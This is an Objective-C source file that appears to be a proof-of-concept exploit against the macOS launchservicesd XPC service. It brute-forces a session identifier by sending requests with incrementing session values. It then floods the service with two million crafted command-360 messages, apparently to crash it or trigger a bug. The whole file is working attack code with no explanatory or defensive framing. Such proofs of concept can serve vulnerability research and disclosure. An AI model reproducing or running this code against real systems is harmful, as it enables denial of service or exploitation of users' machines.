#import <Foundation/Foundation.h>

int main(void) {
    @autoreleasepool {
        char * service_name = "com.apple.coreservices.launchservicesd";
        
        static bool found = false;
        xpc_connection_t conn;
        xpc_object_t message;
        
        static int64_t session, sess = 0;
        sess = 100000;
        
        
        conn = xpc_connection_create_mach_service(service_name, NULL, 0 );
        xpc_connection_set_event_handler(conn, ^(xpc_object_t object) {
                if (xpc_get_type(object) == XPC_TYPE_DICTIONARY) {
                    session = sess;
                }
                // printf("here for %d\n", sess);
        });
        xpc_connection_resume(conn);


        printf("[*] Bruteforcing session id\n");
        for (sess = 100000; ;sess++) {
            if (found) {
                break;
            }
            message = xpc_dictionary_create(NULL, NULL, 0);
            xpc_dictionary_set_int64(message, "command", 100);
            xpc_dictionary_set_int64(message, "session", sess);
            xpc_dictionary_set_uint64(message, "clientversion", 0xdeadbeef);
            xpc_connection_send_message_with_reply(conn, message, NULL, ^(xpc_object_t object) {
                if (xpc_get_type(object) == XPC_TYPE_DICTIONARY) {
                    session = sess;
                    found = true;
                }
            });
            sleep(1);
        }

        printf("[*] Session => %lld\n", session); 
        
        message = xpc_dictionary_create(NULL, NULL, 0);
        xpc_dictionary_set_int64(message, "command", 110);
        xpc_dictionary_set_int64(message, "session", session);

        xpc_connection_send_message_with_reply(conn, message, NULL, ^(xpc_object_t object) {
        });


        for (int i = 0; i < 2000000; i += 1) {
            printf("[*] Flooding request %d\n", i);
            xpc_object_t msg = xpc_dictionary_create(NULL, NULL, 0);
            xpc_dictionary_set_int64(msg, "command", 360);
            xpc_dictionary_set_int64(msg, "session", session);
            xpc_dictionary_set_uint64(msg, "asn", 1);

            xpc_connection_send_message(conn, msg);
        }

        dispatch_main();
    }
    return 0;
}

